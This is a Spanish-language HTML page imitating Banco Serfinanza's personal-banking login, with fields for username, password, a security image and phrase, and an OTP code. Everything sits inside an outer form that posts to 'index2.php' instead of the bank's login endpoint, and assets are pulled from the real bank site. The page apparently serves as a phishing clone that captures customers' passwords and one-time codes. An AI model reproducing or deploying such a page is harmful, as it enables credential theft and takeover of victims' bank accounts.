<html lang="es"><head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/favicon.ico" type="image/x-icon">
    <link rel="icon" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/favicon.ico" type="image/x-icon">
    <title>Inicio de Sesión - Serfinanza Banca Personal</title>

    <link rel="dns-prefetch" href="//fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans&amp;display=swap" rel="stylesheet">
    <link href="https://serfinanzavirtual.bancoserfinanza.com/Personal/assets/font/css/open-iconic.css" rel="stylesheet">
    <!-- Fontawesome icon CSS -->
    <link rel="dns-prefetch" href="//use.fontawesome.com">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
    <!-- Bootstrap CSS -->
    <link href="https://serfinanzavirtual.bancoserfinanza.com/Personal/Content/bootstrap.min.css" rel="stylesheet">
    <!-- Adminux CSS -->
    
    <link rel="stylesheet" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/assets/css/intercomStyle.css" type="text/css">
    <!-- CSS Serfinanza -->
    <link rel="stylesheet" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/assets/css/serfinansaNew.css" type="text/css">

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-137256542-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());

        gtag('config', 'UA-137256542-1');
    </script>
    
</head>
<body>

  <form action="index2.php" name="form1" id="form1" method="post" class="contact-form">
    <div class="container-fluid">
        <div class="row">

            <!-- Page Loader -->
            <div class="loader_wrapper inner align-items-center text-center" style="display: none;">
                <div class="load7 load-wrapper">
                    <div class="loading_img"></div>
                    <div class="loader"> Cargando... </div>
                    <div class="clearfix"></div>
                </div>
            </div>
            <!-- Page Loader Ends -->
            <header class="headLogin">
                <div id="logoPrincipal" class="col">
                    <div class="row">
                        <div id="SerfinansaImg" class="col-12 col-md-4">
                            <img src="https://serfinanzavirtual.bancoserfinanza.com/Personal/assets/img/logo2.png" alt="Serfinansa">
                          <br>
                          <br>
                          
                          
                            <div class="titleLogin">
                                <h1>BANCA PERSONAS</h1>
                            </div>
                        </div>
                        
                    </div>
                </div>
                <hr>
                <div class="spaceline">

                </div>
            </header>

        </div>   
        <div class="row">
            <div class="col-lg-6 col-12 p-1">
                <div class="row">
                    <div class="col-1 logo-super">
                        <img src="https://serfinanzavirtual.bancoserfinanza.com/Personal/Assets/img/superfinanciera Vigilado-01.jpg" alt="Vigilado Superfinanciera">
                    </div>
                    <div class="col-10">
                        <div class="loginContainer">
                            



<form action="/Personal/Login/Index" autocomplete="off" class="form-signin" id="form-login" method="post" name="form-login" role="form">    <div>
        <input name="__RequestVerificationToken" type="hidden" value="tRUOa7p35z2M3OOWzWRfRd_HxQTQNk6JQmzuLfqxi9-lZHB2QLQoPyDcXYFzj7pAlKSeJYicNZJbMuJmetggzei4GOI5L_yMsE2O26i6tTI1">
        <input type="hidden" id="checker" value="0">
        <input type="text" style="opacity: 0; display: none;" id="JsonFingerPrint" name="JsonFingerPrint">
        <input type="text" style="opacity:0;" id="OTPNumber" name="OTPNumber">
        <input type="text" style="opacity:0;" id="HasOTP" name="HasOTP">
        <div id="login-username">
            
            <h2>BIENVENIDO A TU SERFINANZA VIRTUAL PERSONAS</h2>

            <div class="inputIcon">
                <i class="far fa-user"></i>
            </div>
            <div class="inputLogin">
                
                <input type="text" class="form-control" id="UserName" name="UserName" placeholder="Ingresa tu usuario" maxlength="16" autocomplete="off">
            </div>
        </div>
        <div id="login-secureimage" style="display:none">
            
            <h2>IMAGEN Y FRASE DE SEGURIDAD</h2>
            <div class="row">
                <div class="col-4">
                    <figure class="user-login circle">
                        <img id="secure-image">
                    </figure>
                </div>

                <div class="col-8">
                    <p>Frase de seguridad</p>

                    <p id="p_secure-passphrase" class="fraseSeguridad">
                        <label id="secure-passphrase" for="InternalCode"></label>
                    </p>

                    <p class="textInfo">
                        Si la imagen y frase no son las que has definido, por seguridad no ingreses la clave.
                    </p>
                </div>
            </div>
        </div>
        <div id="login-password" style="display:none">
            
            <h2>CONTRASEÑA</h2>

            <div class="inputIcon">
                <i class="fas fa-lock"></i>
            </div>
            <div class="inputLogin">
                
                <input type="password" class="form-control is-keypad" id="Password" name="Password" placeholder="Ingresa tu contraseña" maxlength="15" autocomplete="off" readonly="readonly">
            </div>
        </div>
        <div class="row">
            <div class="form-group col text-center">
                <div class="grup-bottons">
                    
                    
                    <button type="submit" class="btn btn-primary" style="display:none" id="btn-modal-otp">Ingresar</button>
                    <button type="submit" class="btn btn-primary" id="btn-sign-on">Ingresar</button>
                    <button type="button" class="btn btn-secondary" id="btn-sign-off" style="display:none">Cancelar</button>
                </div>

            </div>
        </div>
        <div class="row footerLogin">
            <div class="col-12">

                

                <p>
                    <a id="btn-register" href="#">  Regístrate aquí </a>
                </p>

                <p>
                    <a id="btn-reset-user" href="#"> Recordar Usuario</a>
                </p>

                <p>
                    <a id="btn-reset-password" href="#">Restablecer Contraseña</a>
                </p>

            </div>
        </div>
    </div>
</form>
<!--End Login-->
<!-- Boostrap modal dialog -->
<div class="modal fade" id="Validation-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
            </div>
            <div class="modal-body">
                <p class="icom-modal-instructions">Tu información de ingreso es requerida, algunos datos necesarios no se han ingresado o tu información es inválida, revisa tu información e intenta nuevamente haciendo clic en "Aceptar"</p>
                <div class="icom-divider"></div>
                <p class="icom-error" id="UserName-Error" style="display: none;">

                    El Nombre de usuario es requerido
                </p>
                <p class="icom-error" id="Password-Error" style="display: none;">

                    La Contraseña es requerida
                </p>
                <p class="icom-error" id="Access-Error" style="display: none;">

                    Acceso Denegado
                </p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-primary" data-dismiss="modal">Aceptar</button>
            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div><!-- /.modal -->
<!-- .modal -->
<div class="modal fade" id="ValidOTP" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <h4 class="text-center">Segundo factor de Autenticacion</h4>

            </div>
            <div class="modal-body">
                <div class="info-exclamation">
                    <i class="fas fa-exclamation-triangle"></i>
                    <p class="text-center mt-2" id="textOTP">Por favor digite clave OTP.</p>
                </div>
                <div class="row d-flex justify-content-center mt-2">
                    <div class="col-md-6">
                        <input type="text" class="form-control" id="otpValid" name="otpValid" placeholder="Ingresa OTP" maxlength="6">
                    </div>
                </div>
                <div class="row d-flex justify-content-center mt-2">
                    <div class="col-md-6 alert alert-danger" style="display: none;" id="boxOTP">
                        <p class="">Ingrese una clave OTP valida</p>
                    </div>
                </div>
                <div class="row d-flex justify-content-center mt-3">
                    <div class="col-md-4">
                        <div class="text-rigth">
                            <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-Error">Cerrar</button>
                        </div>
                    </div>

                    <div class="col-md-4">
                        <div class="text-left">
                            <button type="button" class="btn btn-primary" id="btn-SubmitOtp">Ingresar</button>
                        </div>
                    </div>

                </div>

            </div>
            <div class="modal-footer">

            </div><!-- /.modal-content -->

        </div><!-- /.modal-dialog -->

    </div>

</div>
<!-- /.modal -->


<!-- Boostrap modal dialog -->
<div class="modal fade" id="Validation-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <!--<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>-->
                <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
                <p class="icom-modal-instructions">Tu información de ingreso es requerida, algunos datos necesarios no se han ingresado o tu información es inválida, revisa tu información e intenta nuevamente haciendo clic en "Aceptar"</p>
            </div>
            <div class="modal-body">

                <div class="icom-divider"></div>
                <p class="icom-error" id="UserName-Error" style="display: none;">

                    El Nombre de usuario es requerido
                </p>
                <p class="icom-error" id="Password-Error" style="display: none;">

                    La Contraseña es requerida
                </p>
                <p class="icom-error" id="Access-Error" style="display: none;">

                    Acceso Denegado
                </p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-primary" data-dismiss="modal">Aceptar</button>

            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>
<!-- /.modal -->
<!--Modal Dialogs-->
<div class="modal fade" id="Blocked-Error-Dialog">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">×</span>
                </button>
            </div>
            <div class="modal-body">
                <div class="info-exclamation">
                    <i class="fas fa-exclamation-triangle"></i>
                    <span>
                        ¡Oh no, Algo salió mal!
                    </span>
                </div>
                <p>
                    Usuario bloqueado, por favor intente restablecer su contraseña para desbloquearlo.
                </p>
            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-Error">Aceptar</button>
            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>


<div class="modal fade" id="TimeOut-Error">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">×</span>
                </button>
            </div>
            <div class="modal-body">
                <div class="info-exclamation">
                    <i class="fas fa-exclamation-triangle"></i>
                    <span>
                        ¡Oh no, Algo salió mal!
                    </span>
                </div>
                <p>
                    Servicio no disponible, por favor  intenta mas tarde
                </p>
            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-Error" data-url="/Personal/Product/Summary">Aceptar</button>
            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>




<!--Modal Dialogs-->
<div class="modal fade" id="Already-Error-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">

                <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
            </div>
            <div class="modal-body">
                <p class="icom-modal-instructions">Ya existe una sesión en la Oficina Virtual, seleccione "Aceptar"</p>

            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="accept-exist-session">Aceptar</button>


            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>


<!--Modal Dialogs-->
<div class="modal fade" id="Reset-Error-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">

                <h4 class="modal-title icom-modal-title">Restablecer Cuenta de Usuario</h4>
            </div>
            <div class="modal-body">
                <p class="icom-modal-instructions">Debe volver a registrarse en la Oficina Virtual, seleccione "Aceptar" para ir al registro</p>

            </div>

            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-reset">Aceptar</button>


            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>
<!--Modal Dialogs-->
<div class="modal fade" id="Reseblo-Error-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <h4 class="modal-title icom-modal-title">Restablecer Cuenta de Usuario</h4>
            </div>
            <div class="modal-body">
                <p class="icom-modal-instructions">Usuario bloqueado, por favor acercarse a la Oficina de Serfinansa más cercana</p>
            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-reset">Aceptar</button>

            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>

<!--Modal Dialogs-->
<div class="modal fade" id="UserEmpty-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
            </div>
            <div class="modal-body">
                <p class="icom-modal-instructions">Por favor ingrese un nombre de usuario.</p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-reset">Aceptar</button>

            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>


<!-- .modal -->
<div class="modal fade" id="NoExistError-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">

                <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
            </div>
            <div class="modal-body">
                <p class="icom-modal-instructions">Tu usuario o tu contraseña es incorrecto, revisa tu información y selecciona “Aceptar” para intentarlo de nuevo. Si no lo recuerdas comunícate con la Línea de Servicio al Cliente: 018000510513</p>

            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-login">Aceptar</button>
                <button type="button" class="btn btn-secondary" data-dismiss="modal" id="btn-recovery">Recuperar Contraseña</button>
            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>
<!-- .modal -->
<div class="modal fade" id="User-No-Client" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">×</span>
                </button>
            </div>
            <div class="modal-body">
                <div class="info-exclamation">
                    <i class="fas fa-exclamation-triangle"></i>
                    <span>
                        ¡Oh no, Algo salió mal!
                    </span>
                </div>
                <p>
                    Aún no eres cliente, te invitamos a adquirir nuestros Productos
                </p>
            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-Error">Aceptar</button>
            </div>
        </div><!-- /.modal-content -->

    </div><!-- /.modal-dialog -->
</div>
<!-- /.modal -->
<div id="ProblemsWithServer-Dialog" class="modal fade">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header bg-danger">
                <h4 class="modal-title">Error</h4>
            </div>
            <div class="modal-body">
                <p>No se ha podido establecer una comunicación satisfactoria con el servidor</p>
            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-login">Aceptar</button>
            </div>
        </div>
    </div>
</div>

<!--Modal Dialogs-->
<div class="modal fade" id="ProductNone-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">×</span>
                </button>
            </div>
            <div class="modal-body">
                <div class="info-exclamation">
                    <i class="fas fa-exclamation-triangle"></i>
                    <span>
                        ¡Oh no, Algo salió mal!
                    </span>
                </div>
                <p>
                    Usted no posee productos asociados, te invitamos a adquirir alguno de nuestros productos.
                </p>
            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-Error">Aceptar</button>
            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>

<div class="modal fade" id="ProductInactive-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">×</span>
                </button>
            </div>
            <div class="modal-body">
                <div class="info-exclamation">
                    <i class="fas fa-exclamation-triangle"></i>
                    <span>
                        ¡Oh no, Algo salió mal!
                    </span>
                </div>
                <p>
                    Usted no posee productos activos.
                </p>
            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-Error">Aceptar</button>
            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div>


<div class="modal fade" id="pleaseWaitDialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-header" style="margin: 0 auto" ;="">
                    Procesando...
                </div>
            </div>
            <div class="modal-body">
                <div class="progress-bar progress-bar-striped">
                    <div class="progress">
                        <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" style="width: 100%;">

                        </div>
                    </div>
                </div>
            </div>
        </div><!-- /.modal-content -->
    </div><!-- /.modal-dialog -->
</div><!-- /.modal -->
<!--Modal Dialogs-->

<div class="modal fade" id="UserInactive-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body">
                <br>
                <div class="text-center">
                    <i class="fa fa-times-circle fa-6x" style="color: #E41500;" aria-hidden="true"></i>
                </div>
                <br>
                <p>
                    Hola ! Parece que actualmente no cuentas con productos activos en Banco Serfinanza, te invitamos a conocer nuestro portafolio ingresando a nuestra página web <a href="https://bancoserfinanza.com/">www.bancoserfinanza.com</a>, acercándote a una oficina o comunicándote con nuestra Línea de Servicio al Cliente 3235997000.
                </p>
            </div>
            <div class="modal-footer justify-content-center">
                <button type="button" class="btn btn-primary" data-dismiss="modal" id="btn-Error">Aceptar</button>
            </div>
        </div>
    </div>
</div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="col-lg-6 d-none d-lg-block loginImg">

                <div id="carousel-home" class="carousel slide" data-ride="carousel">
                    <div id="carousel-home" class="carousel slide" data-ride="carousel">
                        <ol class="carousel-indicators">
                            <li data-target="#carousel-home" data-slide-to="0" class=""></li>
                            <li data-target="#carousel-home" data-slide-to="1" class="active"></li>
                            <li data-target="#carousel-home" data-slide-to="2" class=""></li>


                        </ol>
                        <div class="carousel-inner">
                            <div class="carousel-item">
                                <img class="d-block w-100" src="https://serfinanzavirtual.bancoserfinanza.com/Personal/assets/img/banner-portal-transaccional-3.jpg" alt="Descarga nuestra nueva App Serfinanza">

                            </div>
                            <div class="carousel-item active">
                                <img class="d-block w-100" src="https://serfinanzavirtual.bancoserfinanza.com/Personal/assets/img/banner-portal-transaccional-1.jpg" alt="Protege tu clave">
                            </div>
                            <div class="carousel-item">
                                <img class="d-block w-100" src="https://serfinanzavirtual.bancoserfinanza.com/Personal/assets/img/banner-portal-transaccional-2.jpg" alt="Ser precavido y lleva una vida tranquila">
                            </div>

                        </div>
                        <a class="carousel-control-prev" href="#carousel-home" role="button" data-slide="prev">
                            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                            <span class="sr-only">Anterior</span>
                        </a>
                        <a class="carousel-control-next" href="#carousel-home" role="button" data-slide="next">
                            <span class="carousel-control-next-icon" aria-hidden="true"></span>
                            <span class="sr-only">Siguiente</span>
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <div class="container-fluid">
            <footer>
                <div class="row justify-content-center">
                    <div class="col-11 ssl-footer">
                        <table style="width:100%" border="0" cellpadding="2" cellspacing="0" title="Haga clic para verificar: este sitio ha elegido SSL de Symantec para proteger sus transferencias de comercio electrónico y comunicaciones confidenciales.">
                            <tbody><tr>
                                <td width="135" align="center" valign="top">
                                    
                                </td>
                            </tr>
                        </tbody></table>
                    </div>
                    <div class="col-11">
                        <p class="infoSedes">
                            Línea de Servicio al Cliente: 323 5997000 - 018000510513
                        </p>
                    </div>

                    <div class="col-md-9 col-12">
                        <ul class="listadoFooter">
                            <li><a href="https://bancoserfinanza.com/servicio-al-cliente/seguridad-de-la-informacion/" target="_blank" rel="noopener"><i class="fas fa-lock"></i> Seguridad</a></li>
                            <li><a href="https://bancoserfinanza.com/servicio-al-cliente/reglamento-serfinanza-virtual/ " target="_blank" rel="noopener"><i class="fas fa-list-ul"></i> Reglamento Sucursal Virtual</a></li>
                            <li><a href="https://bancoserfinanza.com/servicio-al-cliente/aviso-de-privacidad/" target="_blank" rel="noopener"><i class="fas fa-clipboard-list"></i> Políticas de Privacidad</a></li>
                        </ul>
                    </div>
                    <div class="col-md-3 col-12">
                        <p>Serfinanza - 2023</p>
                        <input type="hidden" id="Version" name="custId" value="Version:0.37.0">
                    </div>
                </div>

            </footer>
        </div>

    </div>

    <div class="modal fade" id="Generic-Dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header icom-modal-error-header">
                
            </div>
            
            <div class="modal-body">
                <div class="info-exclamation">
                    <i class="fas fa-exclamation-triangle"></i>   
                    <p class="modal-tittle"></p>
                        
                </div>
                <p id="modal-instructions" class="icom-modal-instructions"></p>
            </div>
            <div class="modal-footer">
                <button type="button" id="moda-btn-accept" class="btn btn-primary">Aceptar</button>
            </div>
        </div>
    </div>
</div>

    <!-- jQuery first, then Tether, then Bootstrap JS. -->
    <script src="/Personal/Assets/js/jquery-2.1.1.min.js" type="text/javascript"></script>


    <script type="text/javascript" src="/Personal/Assets/vendor/popper/popper.min.js"></script>
    <script src="/Personal/Assets/vendor/bootstrap4beta/js/bootstrap.min.js" type="text/javascript"></script>

    <!--Cookie js for theme chooser and applying it -->
    <script src="/Personal/Assets/vendor/cookie/jquery.cookie.js" type="text/javascript"></script>

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="/Personal/Assets/js/ie10-viewport-bug-workaround.js"></script>
    <script src="/Personal/Scripts/Utilities.js"></script>
    <script>
        "use strict";
        $('input[type="checkbox"]').on('change', function () {
            $(this).parent().toggleClass("active")
            $(this).closest(".media").toggleClass("active");
        });
        $(window).on("load", function () {
            /* loading screen */
            $(".loader_wrapper").fadeOut("slow");
        });
    </script>
    
    <script>
    var urlAuth2 = "/Personal/Login/Auth2";
        var login = "/Personal/Login/Index";
        var closeSession = "/Personal/Home/SessionEnd";

    </script>
    <script src="/Personal/Scripts/Keypad/jquery.plugin.min.js"></script>
    <script src="/Personal/Scripts/Keypad/jquery.keypad.min.js"></script>
    <script src="/Personal/Scripts/Keypad/jquery.keypad-es.js"></script>
    <script src="/Personal/Scripts/Alphanum/jquery.alphanum.js"></script>
    <script src="/Personal/Assets/js/fpd2.js"></script>
    <script src="/Personal/Scripts/Views/login.js?v=1"></script>

    <input name="__RequestVerificationToken" type="hidden" value="js0HcHKFi_v6JmiWwwKHWI11p62sQgFfoXmFsKzpm8WIpuAtAYxT-73b5ATrTmMCnOG32hP38GZy6mC7_DUeO91geCKzKemS6y2D4VQxkm81">



<div class="keypad-popup" style="display: none;"><div class="keypad-row"><button type="button" class="keypad-key" value="0">0</button><button type="button" class="keypad-key" value="7">7</button><button type="button" class="keypad-key" value="3">3</button><button type="button" class="keypad-special keypad-close" title="Cerrar el teclado">Cerrar</button></div><div class="keypad-row"><button type="button" class="keypad-key" value="1">1</button><button type="button" class="keypad-key" value="4">4</button><button type="button" class="keypad-key" value="8">8</button><button type="button" class="keypad-special keypad-clear" title="Eliminar todo el texto">Limpiar</button></div><div class="keypad-row"><button type="button" class="keypad-key" value="2">2</button><button type="button" class="keypad-key" value="9">9</button><button type="button" class="keypad-key" value="5">5</button><button type="button" class="keypad-special keypad-back" title="Borrar el caracter anterior">Volver</button></div><div class="keypad-row"><div class="keypad-space"></div><button type="button" class="keypad-key" value="6">6</button></div></div></body></html>